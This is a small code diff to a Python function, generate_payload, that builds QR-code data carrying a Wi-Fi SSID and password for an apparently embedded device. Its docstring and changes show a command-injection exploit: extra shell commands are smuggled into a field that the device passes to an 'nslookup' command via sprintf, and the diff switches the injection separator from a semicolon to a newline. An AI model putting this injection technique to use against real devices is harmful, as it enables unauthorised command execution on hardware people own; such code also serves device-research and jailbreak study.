@@ -29,12 +29,12 @@ def generate_payload(ssid, pwd, payload, post_init):
     """
     qrcode buffer is [1024]
     nslookup sprintf buffer [132]
-    "nslookup a;<payload>0x00"
+    "nslookup a\n<payload>0x00"
     """
     payload.insert(0, 'a')
     qrcode_data = {
         "b": "\\n".join(post_init),
-        "d": ";".join(payload),
+        "d": "\n".join(payload),
         "x": cipher(ssid),
         "y": cipher(pwd),
         "l": "en",
